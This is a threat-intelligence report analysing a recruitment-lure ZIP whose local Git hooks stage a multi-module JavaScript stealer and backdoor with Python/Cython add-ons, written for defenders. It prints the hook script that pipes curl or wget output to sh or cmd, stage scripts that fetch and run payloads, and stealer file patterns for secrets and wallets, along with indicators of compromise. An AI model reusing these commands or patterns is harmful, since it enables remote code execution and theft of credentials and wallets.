---
title: "MansaTrade-Branded Recruitment Lure: Git Hook Staging Chain Delivers Multi-Module JavaScript Backdoor and Native Python Payloads"
date: 2026-04-29
author: "ThreatProphet"
description: "Analysis of a MansaTrade-branded smart-contract developer task delivered through a domain-authenticated email with a ZIP attachment containing malicious local Git hooks, which staged a Node.js loader, multi-module JavaScript backdoor, and native Python/Cython auxiliary payloads."
tags:
  - dprk-linked
  - contagious-interview
  - javascript
  - node-js
  - git-hooks
  - linkedin-lure
  - smart-contract
  - cryptocurrency
  - wallet-theft
  - python
  - cython
  - rat
categories:
  - malware-analysis
  - threat-intelligence
tlp: "CLEAR"
mitre_techniques:
  - T1566.001
  - T1566.003
  - T1204.002
  - T1059.004
  - T1059.007
  - T1059.003
  - T1105
  - T1071.001
  - T1071.002
  - T1027
  - T1005
  - T1113
  - T1115
  - T1082
  - T1016
  - T1120
  - T1041
report_id: "TP-2026-011"
showToc: true
---

> *"The contract promised trust; the hooks carried the knife."*

## Executive Summary

The case began with a recruitment-themed approach using MansaTrade-branded identity material. After the victim was contacted through LinkedIn about a purported job opportunity and asked to provide a CV and email address, a recruiter persona calling himself **Enrique** used that address to deliver a purported smart-contract developer task as a ZIP attachment.

The follow-on email was displayed as coming from `Recruiter of MansaTrade <recruiter@mansatrade[.]org>`. Header analysis shows that the message passed SPF and DMARC at Google and was authenticated through Hostinger/MailChannels infrastructure for `recruiter@mansatrade[.]org`; DKIM was neutral because the body hash did not verify. This means the message should not be treated as simple display-name spoofing. It does **not** establish whether the mailbox or domain was actor-created, compromised, legitimately operated by the brand, or otherwise misused.

Additional domain and website checks show a recent, low-assurance public footprint rather than a mature corporate identity. `mansatrade[.]org` was registered through Hostinger on 2026-01-12 and updated on 2026-01-17; the website is served from Hostinger/LiteSpeed infrastructure and exposes a small single-page application describing a no-KYC, multi-chain P2P crypto marketplace. These findings support treating MansaTrade as **brand and lure infrastructure with unresolved ownership/control**, not as a validated company and not as simple third-party impersonation. No finding in this report should be read as evidence that any legitimate MansaTrade project, company, community, or brand owner knowingly participated in the activity.

The ZIP presented as a plausible blockchain project named `p2pcontract`, containing Hardhat, Ethereum smart-contract, and Solana-related project material. The malicious execution mechanism was not placed in the obvious application logic. Instead, it was hidden inside local Git client hooks preserved inside the archive: `.git/hooks/pre-commit` and `.git/hooks/pre-push`. This is an important distinction: Git hooks are normally local client-side files and are not transferred by an ordinary remote Git clone, but they **are** preserved when a project is distributed as a ZIP containing the full `.git/` directory.

The recovered chain progressed from Git hook execution to Short.io redirects, token-gated staging, an obfuscated Node.js parser, a descriptor service, and a large multi-module JavaScript payload. The final recovered JavaScript framework contains browser and wallet collection, local secret-file discovery, a TCP backdoor, remote-control functionality, FTP-based exfiltration support, and a native auxiliary branch that delivers Windows and macOS Python/Cython modules.

The technical linkage to the recovered `31d27f3f2f35` / `hgMoMq7` staging chain is assessed with **high confidence**. Attribution to DPRK-linked Contagious Interview-style activity remains **low-to-medium confidence**: the social engineering and payload objectives align with public reporting on fake developer interview operations, but this investigation does not contain a single infrastructure, identity, or build artifact sufficient for definitive state attribution.

## Evidence Basis and Scope

This report is based on static analysis of the delivered ZIP archive, local Git metadata, recovered Git hooks, controlled retrieval of staged payloads, preserved HTTP redirect/capture material, and static triage of JavaScript, Python runtime, PE, and Mach-O artifacts. Payloads were **not executed** during analysis.

The evidence archive is not distributed with this public report. Hashes, decoded descriptors, URLs, command patterns, and observable behavior are provided so other researchers can compare independent samples. Empty responses and expired-token responses are retained analytically because they document infrastructure state and token-gating behavior at collection time.

**Brand/account-use notice:** this report treats MansaTrade-branded material as lure context and low-assurance recruitment infrastructure. Because the email passed SPF and DMARC and used an authenticated `recruiter@mansatrade[.]org` sender path, the investigation does not describe the email as simple spoofing. Because the domain and public website appear recent and thin, the investigation also does not treat MansaTrade as a validated corporate entity. The available evidence does not determine whether the mailbox/domain was actor-created, compromised, legitimately operated, or otherwise misused. The malware linkage begins with the delivered ZIP and recovered staging chain.

## Key Findings

| Finding | Assessment |
|---|---|
| Initial access vector | LinkedIn recruitment approach followed by domain-authenticated email delivery of developer-task ZIP |
| Lure theme | MansaTrade-branded smart-contract / Hardhat skill test |
| Brand/domain status | Recent, low-assurance public footprint; ownership/control unresolved |
| Execution trigger | `.git/hooks/pre-commit` and `.git/hooks/pre-push` |
| First-stage delivery | Short.io redirect links under `chvsvr.short[.]gy` |
| Staging host | `165.140.86[.]190:3000` |
| Campaign token | `31d27f3f2f35` |
| Campaign/group marker | `hgMoMq7` |
| Stage-3 descriptor | `ZT3MTQ3LjEyNC4yMDIuMjA2LGhnTW9NcTc=` |
| Decoded descriptor | `147.124.202[.]206,hgMoMq7` |
| Stage-4 role | Multi-module JavaScript stealer/backdoor framework |
| Auxiliary branch | Windows DLL, macOS Mach-O bundle, Windows Python runtime ZIP |
| Attribution | Low-to-medium confidence DPRK-linked / Contagious Interview consistency, not definitive |

## Attack Overview

### Initial Contact

The target was approached through LinkedIn with a job opportunity. The actor requested a CV and email address, then used email to deliver the developer task. The email stated:

```text
Hello, Luka.
Nice to meet you.
I am recruiter of MansaTrade.

We have briefly reviewed your profile and resume, and it looks good.
I think you should be in charge of Smart Contract.

You have a short skill test for Smart Contract now.
We need to set hardhat environment to build the Smart Contract.
Our project is private, and we cannot give you role in github now.
But we can share the project here.

You have to check the Smart Contract on EVM, then the skill test is you have to make test function in hardhat (it is in the project.) to create offer. 
You can share your result with new repo on your git profile,.
We may push it directly, if your result is good. (It is plus for meeting with CTO and to have a position in the team)

Thanks.
Enrique
```

The wording is consistent with fake developer interview operations: the actor presents a plausible private project, avoids immediate GitHub access, and frames execution of the provided code as a prerequisite for technical evaluation. The wording should be treated as lure text, not as evidence that any legitimate MansaTrade brand or community knowingly participated in the activity.

### Email Authentication and Delivery Metadata

The preserved `.eml` shows a visible sender of `Recruiter of MansaTrade <recruiter@mansatrade[.]org>` and a `Return-Path` of `recruiter@mansatrade[.]org`. Google authentication results showed SPF pass for `recruiter@mansatrade[.]org`, DMARC pass with `header.from=mansatrade.org`, and DKIM neutral because the DKIM body hash did not verify. The message path included MailChannels relay infrastructure and Hostinger outbound SMTP, with `X-AuthUser: recruiter@mansatrade.org` and an authenticated sender path through Hostinger.

Analytically, this is stronger than display-name spoofing. It supports that the message was sent through infrastructure authorized or authenticated for the `mansatrade[.]org` mailbox. It does not establish whether that mailbox was controlled by the legitimate brand owner, actor-created, compromised, or otherwise abused. The public attribution boundary therefore remains the delivered ZIP, Git-hook execution chain, and recovered staging infrastructure.

### MansaTrade Domain and Public-Footprint Assessment

Public-footprint checks add useful context but do not resolve ownership or control. The `mansatrade[.]org` domain was created on 2026-01-12, updated on 2026-01-17, registered through Hostinger, and configured with Hostinger parking nameservers. DNSSEC was not enabled in the observed WHOIS output. The DKIM selector used in the email points to Hostinger mail infrastructure, and the DMARC record is present but set to `p=none`. The website was served by Hostinger/LiteSpeed and the captured HTTP headers showed `Last-Modified: Tue, 20 Jan 2026 16:50:28 GMT`.

The captured website is a small single-page React application with generic cryptocurrency/P2P marketplace positioning, including claims of a multi-chain P2P trading marketplace and no-KYC/no-registration wallet-connect usage. This public footprint is consistent with a recently created or thinly maintained brand presence. It does not prove that the domain is malicious, but it reduces confidence that MansaTrade should be treated as an established, independently validated company.

Assessment: the safest phrasing is **MansaTrade-branded recruitment lure** or **MansaTrade-branded recruitment infrastructure**. The evidence does not support a stronger conclusion that the campaign was merely display-name spoofing, nor does it establish that a legitimate company knowingly participated. Domain, mailbox, and brand-control status remain unresolved.

### Lure Archive

The delivered ZIP file was named:

```text
p2pcontract.zip
```

Static archive inspection showed a project structure consistent with a blockchain developer task. The original ZIP hash is `088bdef73a0ac20c29ace0fbac549b274c04ce65ebb743c47acf038b44315d4b`:

```text
p2pcontract/contract/hardhat/
p2pcontract/contract/p2pContract_eth/
p2pcontract/contract/p2pContract_sol/
```

The archive also contained a full `.git/` directory. The listing confirms active local hooks at `p2pcontract/.git/hooks/pre-commit` and `p2pcontract/.git/hooks/pre-push`, each 505 bytes, alongside normal sample hooks. This is important because the malicious execution triggers were hidden inside local Git hooks, not in the visible source code. An ordinary remote Git clone would not transfer another user's local hook files, but a ZIP containing `.git/` can preserve and deliver them.

### Git Metadata

The `.git/config` file contained the following user identity:

```text
name  = enrique1281
email = karrem1281@outlook[.]sa
```

The current Git commit recovered from the archive was:

```text
002a2cecb914eb498b30e9d7f282c89a4d0fd38a
```

Author and committer:

```text
enrique1281 <karrem1281@outlook[.]sa>
```

Commit timestamp:

```text
2026-02-11T15:12:42+09:00
```

This timestamp predates the April 2026 collection and may represent repository preparation time, reuse, or actor-controlled backdating. It should not be treated as operator local time without additional corroboration.

## Kill Chain

```text
LinkedIn recruitment lure
  -> email delivery of p2pcontract.zip
  -> ZIP contains .git/hooks/pre-commit and pre-push
  -> hooks fetch Short.io platform links
  -> Short.io redirects to 165.140.86[.]190:3000/task/{linux,mac,windows}
  -> stage 1 retrieves JWT-gated tokenlinux/token script
  -> stage 2 prepares Node.js and retrieves parser
  -> stage 3 contacts 78.142.218[.]26:1244/s/31d27f3f2f35
  -> descriptor decodes to 147.124.202[.]206,hgMoMq7
  -> stage 3 downloads /f/hgMoMq7 and /p
  -> stage 4 executes browser/wallet collector, file collector, backdoor, remote-control module
  -> stage 4 retrieves auxiliary native/Python payloads
```

## Technical Analysis

### Stage 0: Git Hook Execution Trigger

Both `.git/hooks/pre-commit` and `.git/hooks/pre-push` contained the same script. The hooks selected a platform-specific Short.io URL based on `$OSTYPE`:

```sh
#!/bin/sh
# Custom curl command for pre-commit hook

case "$OSTYPE" in
  darwin*)  curl -s 'hxxps://chvsvr.short[.]gy/hgMoMq7m' -L | sh  > /dev/null 2>&1 &;; 
  linux*)   wget -qO- 'hxxps://chvsvr.short[.]gy/hgMoMq7l' -L | sh  > /dev/null 2>&1 &;; 
  msys*)    curl -s hxxps://chvsvr.short[.]gy/hgMoMq7w -L | cmd  > /dev/null 2>&1 &;; 
  cygwin*)  curl -s hxxps://chvsvr.short[.]gy/hgMoMq7w -L | cmd  > /dev/null 2>&1 &;; 
  *)        curl -s 'hxxps://chvsvr.short[.]gy/hgMoMq7m' -L | sh  > /dev/null 2>&1 &;; 
esac
```

The hook hash was:

```text
833e21d7e68b8dcbadc2930d659581e3d4a7b9b96fcac4453a91e86754dc12c2
```

This design is operationally significant for two reasons. First, Git hooks are hidden inside `.git/` and are not usually reviewed as part of ordinary source-code inspection. Second, the payload is executed when the user performs Git operations such as commit or push, which aligns with the expected workflow for a developer skill test. This makes the trigger less immediate than VS Code `folderOpen` task abuse, but still operationally reliable because the task explicitly asks the target to modify tests and share or push results.

### Stage 1: Short.io Redirect Layer

The hook URLs redirected as follows:

| Platform | Short.io URL | Redirect Target |
|---|---|---|
| Linux | `hxxps://chvsvr.short[.]gy/hgMoMq7l` | `hxxp://165.140.86[.]190:3000/task/linux?token=31d27f3f2f35` |
| macOS | `hxxps://chvsvr.short[.]gy/hgMoMq7m` | `hxxp://165.140.86[.]190:3000/task/mac?token=31d27f3f2f35` |
| Windows | `hxxps://chvsvr.short[.]gy/hgMoMq7w` | `hxxp://165.140.86[.]190:3000/task/windows?token=31d27f3f2f35` |

The initial Short.io response body was empty because the shortener returned HTTP 301 with `Content-Length: 0`. The redirect target was preserved in the `Location:` header.

### Stage 1 Platform Scripts

#### Linux

The Linux stage-1 script printed `Authenticated`, wrote a file under `~/Documents`, renamed it, marked it executable, normalized line endings, and launched it with `nohup bash`:

```sh
TARGET_DIR="$HOME/Documents"
wget -q -O "$TARGET_DIR/tokenlinux.npl" "hxxp://165.140.86[.]190:3000/task/tokenlinux?token=31d27f3f2f35&st=<JWT>"
mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
chmod +x "$TARGET_DIR/tokenlinux.sh"
sed -i -e 's/
$//' "$TARGET_DIR/tokenlinux.sh"
nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
```

#### macOS

The macOS stage-1 script used `~/.task` instead:

```sh
mkdir -p "$HOME/.task"
curl -s -L -o "$HOME/.task/tokenlinux.sh" "hxxp://165.140.86[.]190:3000/task/tokenlinux?token=31d27f3f2f35&st=<JWT>"
chmod +x "$HOME/.task/tokenlinux.sh"
sed -i -e 's/
$//' "$HOME/.task/tokenlinux.sh"
nohup bash "$HOME/.task/tokenlinux.sh" > /dev/null 2>&1 &
```

#### Windows

The Windows stage-1 branch deleted prior local artifacts, downloaded a token-gated command script, renamed it to `token.cmd`, and executed it. The recovered hook uses Git-for-Windows style `msys`/`cygwin` matching, so exact redirection/path behavior may vary depending on the shell used to invoke the hook:

```bat
if exist "%USERPROFILE%\parse" del "%USERPROFILE%\parse"
if exist "%USERPROFILE%	oken.cmd" del "%USERPROFILE%	oken.cmd"
curl -s -L -o "%USERPROFILE%//parse" "hxxp://165.140.86[.]190:3000/task/token?token=31d27f3f2f35&st=<JWT>"
ren "%USERPROFILE%\parse" token.cmd
"%USERPROFILE%	oken.cmd"
```

The `st=` parameter is a short-lived JWT. During collection, stale stage-2 URLs returned:

```text
Access permanently suspended.
```

This is consistent with token freshness, token invalidation, source fingerprinting, or a combination of these controls. The preserved response confirms access gating, but does not by itself identify the exact server-side validation rule.

### Stage 2: Node.js Bootstrapper

The Linux and macOS stage-2 scripts were Bash scripts with CRLF line endings. They prepared a Node.js runtime under `~/.task` and then retrieved the parser stage. The Linux/macOS stage-2 body referenced Node.js version:

```text
20.11.1
```

Relevant local paths included:

```text
$HOME/.task/node-v20.11.1-linux-x64.tar.xz
$HOME/.task/node-v20.11.1-darwin-x64.tar.xz
$HOME/.task/tokenlinux.sh
```

The Windows stage-2 script used PowerShell to restart hidden, staged or extracted portable Node.js, and continued to fetch the parser stage.

Stage 2 exposed the following next-stage URLs:

```text
hxxp://165.140.86[.]190:3000/task/package.json
hxxp://165.140.86[.]190:3000/task/parser?token=31d27f3f2f35&st=<JWT>
```

The `package.json` retrieved from the staging host contained dependencies consistent with a Node.js malware runtime:

```json
{
  "name": "tokendapp",
  "version": "1.0.0",
  "dependencies": {
    "axios": "^1.12.2",
    "basic-ftp": "^5.0.5",
    "clipboardy": "^4.0.0",
    "execp": "^0.0.1",
    "jsonwebtoken": "^9.0.2",
    "request": "^2.88.2"
  }
}
```

### Stage 3: Obfuscated Parser Loader

The parser retrieved from `/task/parser` was a heavily obfuscated Node.js loader. It used:

```text
rotated string table
custom base64-like decoding
fake-prefix base64 strings
XOR-decoded literals
```

The stage-3 parser contained the campaign token:

```text
31d27f3f2f35
```

It contacted the following descriptor endpoints:

```text
hxxp://78.142.218[.]26:1244/s/31d27f3f2f35
hxxp://66.235.168[.]17:1244/s/31d27f3f2f35
```

During collection, the primary endpoint returned:

```text
ZT3MTQ3LjEyNC4yMDIuMjA2LGhnTW9NcTc=
```

Decoded value:

```text
147.124.202[.]206,hgMoMq7
```

The fallback endpoint on `66.235.168[.]17:1244` returned an empty body during this collection window. The empty fallback response was preserved as negative evidence.

Once the descriptor was decoded, stage 3 constructed:

```text
hxxp://147.124.202[.]206:1244
```

It then downloaded:

```text
/f/hgMoMq7  -> f.js
/p          -> package.json
```

The loader used `~/.vscode/` as a staging directory where possible and executed `f.js` through Node.js after dependency installation.

### Stage 4: Multi-Module JavaScript Payload

The stage-4 payload retrieved from:

```text
hxxp://147.124.202[.]206:1244/f/hgMoMq7
```

was a large obfuscated JavaScript payload embedding multiple internal modules. The recovered stage-4 file size was 92,626 bytes and the matching SHA-256 hash was:

```text
09a303aadcf362dfea8e6410f0424ea4eb199c053d331e1a54aee63db85b66ef
```

The stage-4 package file from `/p` contained dependencies that align with the payload behavior:

```json
{
  "dependencies": {
    "ajv": "^8.17.1",
    "axios": "^1.12.2",
    "basic-ftp": "^5.0.5",
    "request": "^2.88.2",
    "socket.io": "^4.8.3",
    "stream": "^0.0.3",
    "unzipper": "^0.12.3"
  }
}
```

The embedded modules were identified as:

| Module | Role |
|---|---|
| `g` | Browser profile, credential-store, and wallet-extension collector |
| `n` | TCP backdoor with command execution, file browsing, file read/write, and FTP exfiltration |
| `s` | Remote-control module with screenshot, mouse, keyboard, and clipboard functionality |
| `z` | File discovery and exfiltration module targeting secrets, wallets, keys, configs, and developer files |

#### Module `g`: Browser and Wallet Collector

Module `g` targets Chromium-family browser profile data across Windows, macOS, and Linux. It searches browser profile roots associated with:

```text
Google Chrome
Brave Browser
Opera
Microsoft Edge
Chromium
LT Browser
```

Targeted browser files and directories include:

```text
Login Data
Web Data
Local Extension Settings
```

The module enumerates cryptocurrency wallet extension IDs, including well-known wallet storage locations such as MetaMask-compatible extension IDs.

Collected material is uploaded to:

```text
hxxp://147.124.202[.]206:1244/uploads
```

#### Module `z`: Secret and Developer-File Collector

Module `z` searches for high-value local files. Decoded search patterns include:

```text
*.env
*config.js
*secret*
*metamask*
*wallet*
*private*
*mnemonic*
*password*
*account*
*seed*
*keys*
*keypair.json
*1pass*.sqlite
*notes.txt
hardhat.config.ts
*solana*
*.kdbx
```

This indicates targeting of developer secrets, wallet seed material, Solana keypairs, Hardhat configuration, password databases, and environment files.

#### Module `n`: TCP Backdoor

Module `n` implements a raw TCP backdoor and host inventory component. It imports networking, filesystem, process, HTTP, crypto, stream, and FTP modules.

Observed capabilities include:

```text
host inventory
external IP enrichment through ip-api[.]com/json
raw TCP C2 connection
heartbeat and reconnect logic
shell command execution
directory listing
subdirectory listing
file read
file write
file search
file/directory upload through FTP-capable code paths
browser process termination
auxiliary payload launch
```

The TCP backdoor endpoint is:

```text
165.140.86[.]183:1247
```

#### Module `s`: Remote-Control Module

Module `s` connects to:

```text
hxxp://165.140.86[.]183:2246
```

It imports or expects support for:

```text
socket.io-client
screenshot-desktop
clipboardy
sharp
uuid
@nut-tree-fork/nut-js
```

Capabilities include:

```text
screenshot capture
screenshot compression and resizing
mouse movement
mouse clicking
scrolling
keyboard down/up event injection
key combinations
clipboard write
clipboard read
cursor position beaconing
```

It also contains a Linux anti-VM check using `/proc/cpuinfo`. If it detects strings such as `hypervisor`, `vmware`, `virtualbox`, `kvm`, or `xen`, it exits.

## Auxiliary Native/Python Branch

Stage 4 also retrieved auxiliary payloads:

```text
hxxp://45.59.163[.]50:1244/pd2
hxxp://147.124.202[.]206:1244/clw/hgMoMq7
hxxp://147.124.202[.]206:1244/clw1/hgMoMq7
hxxp://165.140.86[.]183:1244/c/hgMoMq7
```

The first three returned substantive artifacts. The `/c/hgMoMq7` endpoint returned an empty body during collection and was preserved as negative evidence.

### `/pd2`: Windows Python Runtime Package

The `/pd2` endpoint returned a ZIP archive:

```text
SHA-256: a3d116d199d5dae30528cb1e3c5d416ba3c676f82b38285c401dc74ed81763c9
Size: 54.8 MB
Entries: 8,239
```

The archive contained a bundled Python runtime under:

```text
.py2/
```

Notable contents:

```text
.py2/py.exe
.py2/pythonw.exe
.py2/python312.dll
.py2/python3.dll
.py2/vcruntime140.dll
.py2/vcruntime140_1.dll
.py2/DLLs/
.py2/Lib/
.py2/Lib/site-packages/
.py2/Scripts/
```

Notable bundled libraries:

```text
aiohttp
websockets
websocket-client
requests
urllib3
web3
eth_account
eth_keys
eth_utils
Crypto
Cryptodome
cryptography
ecdsa
psutil
pynput
pyperclip
py7zr
pywin32
```

Assessment: `/pd2` provides the Windows-side Python 3.12 runtime required to load and run the downloaded Cython extension module.

### `/clw/hgMoMq7`: Windows Python/Cython Module

The `/clw/hgMoMq7` endpoint returned:

```text
PE32+ executable for MS Windows 6.00 (DLL), x86-64
SHA-256: d98432b60071e217432ba56d5f89b2173df8388424b804e3d8e4ba5d6dbd94d0
Size: 44,544 bytes
```

Static metadata:

```text
DLL/export name: mod.pyd
Exported function: PyInit_mod
Imports: python312.dll, KERNEL32.dll, VCRUNTIME140.dll
Compile/link timestamp: 2026-04-22 05:55:34 UTC
Source reference: mod.pyx
```

Assessment: this is a Windows CPython 3.12 extension module, likely built with Cython from `mod.pyx`. It should not be imported outside a disposable instrumented VM because import may execute module initialization logic.

### `/clw1/hgMoMq7`: macOS Python/Cython Module

The `/clw1/hgMoMq7` endpoint returned:

```text
Mach-O 64-bit x86_64 bundle
SHA-256: d11f8e1512ade99b27f44ab9eeff417688e3ff75b7d41f1e8a65a1efe70a3ea0
Size: 52,872 bytes
```

Static strings and symbols included:

```text
_PyInit_mod
mod.pyx
mod.c
___pyx_pymod_exec_mod
/Users/administrator/.pyenv/versions/3.12.9/lib
/Users/administrator/Documents/K_Work/
/Users/administrator/Documents/K_Work/build/temp.macosx-15.7-x86_64-cpython-312/mod.o
```

Assessment: this is the macOS counterpart to the Windows `mod.pyd`: a CPython 3.12/Cython extension module named `mod`. The build path leak is useful pivot material but should not be treated as a real operator identity without corroboration.

## Infrastructure Analysis

### Stage and C2 Infrastructure

| Indicator | Role |
|---|---|
| `chvsvr.short[.]gy` | Short.io redirect layer |
| `165.140.86[.]190:3000` | Stage-1, stage-2, parser, and package staging |
| `78.142.218[.]26:1244` | Active stage-3 descriptor endpoint |
| `66.235.168[.]17:1244` | Stage-3 fallback descriptor endpoint, empty during collection |
| `147.124.202[.]206:1244` | Stage-4 payload, package, uploads, auxiliary `/clw` and `/clw1` |
| `45.59.163[.]50:1244` | Auxiliary `/pd2` ZIP package |
| `165.140.86[.]183:1247` | TCP backdoor endpoint |
| `165.140.86[.]183:2246` | Remote-control Socket.IO endpoint |
| `165.140.86[.]183:1244` | Auxiliary `/c/hgMoMq7` candidate, empty during collection |
| `ip-api[.]com/json` | External IP/geolocation enrichment |

### Descriptor Decoding

Raw descriptor:

```text
ZT3MTQ3LjEyNC4yMDIuMjA2LGhnTW9NcTc=
```

Decoded after removing the `ZT3` prefix and base64-decoding the remainder:

```text
147.124.202[.]206,hgMoMq7
```

This descriptor binds the campaign token `31d27f3f2f35` to the dynamic stage-4 host and group marker `hgMoMq7`.

## Relationship to Prior ThreatProphet Reporting

This campaign fits the broader pattern documented across prior ThreatProphet reporting on fake developer interviews and Web3-oriented social engineering. The shared pattern includes recruiter personas, developer skill-test framing, blockchain/Web3 themes, hidden execution paths outside obvious business logic, multi-stage JavaScript payload delivery, and wallet/developer-secret targeting.

However, this report should not overstate common operator control. Unlike TP-2026-009 and TP-2026-010, this case does not currently rely on byte-identical server-side files or the same Vercel/Hetzner `88.99.241[.]111` beacon infrastructure. The stronger linkage in this case is internal to the recovered chain itself: the `31d27f3f2f35` campaign token, the `hgMoMq7` group marker, the descriptor format, and the stage-4 module set.

Relevant internal comparison points:

| Prior report | Correlation point |
|---|---|
| TP-2026-001, Interview Trap | LinkedIn fake technical assessment, developer-targeted repository, multi-stage JavaScript implant |
| TP-2026-004, BetPoker | Web3 fake interview targeting blockchain developers |
| TP-2026-009, Dravion-Core | Recruiter persona, staged developer lure, environment-focused JavaScript staging |
| TP-2026-010, DLabs Hungary impersonation | Developer recruitment lure and abuse of development workflow tooling |

## Attribution Assessment

Assessed attribution confidence: **Low to medium**

The campaign is consistent with publicly documented fake developer interview operations commonly tracked under Contagious Interview and related DPRK-linked reporting. MITRE tracks Contagious Interview as a North Korea-aligned activity cluster targeting software-development and cryptocurrency-related users, and public reporting continues to document abuse of legitimate developer workflows for malware delivery.

The evidence in this investigation is nevertheless technical and behavioral. No single recovered infrastructure item, identity string, build path, email address, or token is sufficient to attribute the activity to a specific state actor. The `enrique1281` / `karrem1281@outlook[.]sa` Git identity, the `+09:00` commit timestamp, and the Cython build paths are useful pivots, but they should not be treated as real-world identity or geography indicators without corroboration.

The report therefore uses two confidence levels:

| Assessment | Confidence | Basis |
|---|---:|---|
| Linkage to the recovered `31d27f3f2f35` / `hgMoMq7` staging chain | High | Direct recovered hooks, redirects, descriptor, payloads, and hashes |
| Alignment with DPRK-linked Contagious Interview-style developer targeting | Low to medium | TTP overlap with fake developer recruitment, Web3 targeting, JavaScript malware, wallet/credential collection, and remote-access functionality |

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Notes |
|---|---|---|---|
| T1566.001 | Spearphishing Attachment | Initial Access | ZIP developer task delivered by email |
| T1566.003 | Spearphishing via Service | Initial Access | LinkedIn recruitment approach and follow-on email workflow |
| T1204.002 | User Execution: Malicious File | Execution | Victim expected to work with the project and trigger Git hooks through commit/push workflow |
| T1059.004 | Unix Shell | Execution | Git hooks pipe fetched content to `sh`; Linux/macOS bootstrap scripts |
| T1059.003 | Windows Command Shell | Execution | Windows branch pipes fetched content to `cmd` and uses command scripts |
| T1059.007 | JavaScript | Execution | Obfuscated Node.js parser and stage-4 JavaScript modules |
| T1105 | Ingress Tool Transfer | Command and Control | Multiple staged payload downloads through `/task`, `/f`, `/p`, `/clw`, `/clw1`, and `/pd2` |
| T1071.001 | Web Protocols | Command and Control | HTTP staging, descriptor retrieval, payload retrieval, upload endpoints, and Socket.IO remote-control endpoint |
| T1071.002 | File Transfer Protocols | Exfiltration | Stage-4 code includes FTP-capable exfiltration paths |
| T1027 | Obfuscated Files or Information | Defense Evasion | Rotated string tables, base64 encodings, fake prefixes, and XOR-decoded literals |
| T1005 | Data from Local System | Collection | File discovery and collection from local filesystem |
| T1113 | Screen Capture | Collection | Remote-control module supports screenshot capture |
| T1115 | Clipboard Data | Collection | Remote-control module reads and writes clipboard content |
| T1082 | System Information Discovery | Discovery | Host inventory and external IP/geolocation enrichment |
| T1016 | System Network Configuration Discovery | Discovery | Network and host profile collection paths observed in backdoor modules |
| T1120 | Peripheral Device Discovery | Discovery | Windows drive enumeration logic |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | Upload endpoint and C2-mediated transfer paths |

Keyboard and mouse control are described as remote-control capabilities in the payload analysis. They are not mapped to input-capture techniques unless future dynamic analysis confirms actual keylogging or credential input capture.

## Indicators of Compromise

All indicators are assessed **high confidence** unless otherwise noted.

### Network Indicators

| Indicator | Type | Notes |
|---|---|---|
| `chvsvr.short[.]gy` | Domain | Short.io redirect host |
| `hxxps://chvsvr.short[.]gy/hgMoMq7l` | URL | Linux hook stage |
| `hxxps://chvsvr.short[.]gy/hgMoMq7m` | URL | macOS hook stage |
| `hxxps://chvsvr.short[.]gy/hgMoMq7w` | URL | Windows hook stage |
| `165.140.86[.]190` | IPv4 | Stage-1 to stage-3 staging host |
| `hxxp://165.140.86[.]190:3000/task/linux?token=31d27f3f2f35` | URL | Linux stage-1 |
| `hxxp://165.140.86[.]190:3000/task/mac?token=31d27f3f2f35` | URL | macOS stage-1 |
| `hxxp://165.140.86[.]190:3000/task/windows?token=31d27f3f2f35` | URL | Windows stage-1 |
| `hxxp://165.140.86[.]190:3000/task/tokenlinux` | URL path | Linux/macOS stage-2, JWT-gated |
| `hxxp://165.140.86[.]190:3000/task/token` | URL path | Windows stage-2, JWT-gated |
| `hxxp://165.140.86[.]190:3000/task/parser` | URL path | Stage-3 parser, JWT-gated |
| `hxxp://165.140.86[.]190:3000/task/package.json` | URL | Stage-2 package file |
| `78.142.218[.]26` | IPv4 | Stage-3 descriptor primary |
| `hxxp://78.142.218[.]26:1244/s/31d27f3f2f35` | URL | Active descriptor endpoint |
| `66.235.168[.]17` | IPv4 | Stage-3 descriptor fallback |
| `hxxp://66.235.168[.]17:1244/s/31d27f3f2f35` | URL | Empty fallback during collection |
| `147.124.202[.]206` | IPv4 | Stage-4 and upload host |
| `hxxp://147.124.202[.]206:1244/f/hgMoMq7` | URL | Stage-4 payload |
| `hxxp://147.124.202[.]206:1244/p` | URL | Stage-4 package file |
| `hxxp://147.124.202[.]206:1244/uploads` | URL | Upload endpoint |
| `hxxp://147.124.202[.]206:1244/keys` | URL | Check-in endpoint |
| `hxxp://147.124.202[.]206:1244/keync` | URL | Stage-3 check-in endpoint |
| `hxxp://147.124.202[.]206:1244/clw/hgMoMq7` | URL | Windows Cython module |
| `hxxp://147.124.202[.]206:1244/clw1/hgMoMq7` | URL | macOS Cython module |
| `45.59.163[.]50` | IPv4 | Auxiliary ZIP host |
| `hxxp://45.59.163[.]50:1244/pd2` | URL | Windows Python runtime ZIP |
| `165.140.86[.]183:1247` | Host:port | TCP backdoor |
| `hxxp://165.140.86[.]183:2246` | URL | Remote-control Socket.IO endpoint |
| `hxxp://165.140.86[.]183:1244/c/hgMoMq7` | URL | Auxiliary candidate, empty during collection |
| `hxxp://ip-api[.]com/json` | URL | External IP/geolocation enrichment |

### Email and Lure Metadata

These indicators are included as lure and delivery metadata, not as proof that the legitimate brand owner participated in the activity. The domain and mail records indicate a recent Hostinger-backed presence, but they do not establish legitimate corporate control or actor ownership.

| Indicator | Type | Notes |
|---|---|---|
| `recruiter@mansatrade[.]org` | Email sender / Return-Path | Domain-authenticated delivery path observed in preserved `.eml`; not evidence of legitimate brand involvement |
| `mansatrade[.]org` | Domain | Created 2026-01-12 via Hostinger; recent, low-assurance public footprint; brand/domain control status unresolved |
| `recruiter@mansatrade[.]org` / `X-AuthUser` | Authenticated mailbox indicator | Hostinger-authenticated sender path observed in headers |
| `_dmarc.mansatrade[.]org` | DNS TXT | DMARC present with `p=none`; alignment passed in Gmail but policy is non-enforcing |
| `hostingermail-a._domainkey.mansatrade[.]org` | DKIM selector | CNAME to Hostinger DKIM infrastructure; message DKIM result was neutral due to body hash mismatch |
| Hostinger / LiteSpeed / hPanel | Web/mail hosting context | Website and mail path both point to Hostinger-backed infrastructure |
| `23.83.212[.]18` | Mail relay IP | MailChannels relay seen in received path; mail infrastructure context, not malware C2 |
| `148.222.54[.]43` | Mail provider IP | Hostinger outbound SMTP seen in received path; mail infrastructure context, not malware C2 |
| `70.44.85[.]172` | Client/source IP in mail path | Googleusercontent-hosted source observed in `Received` chain; requires separate enrichment before interpretation |
| `enrique1281` | Git/user identity | Present in recovered Git config and HEAD commit metadata |
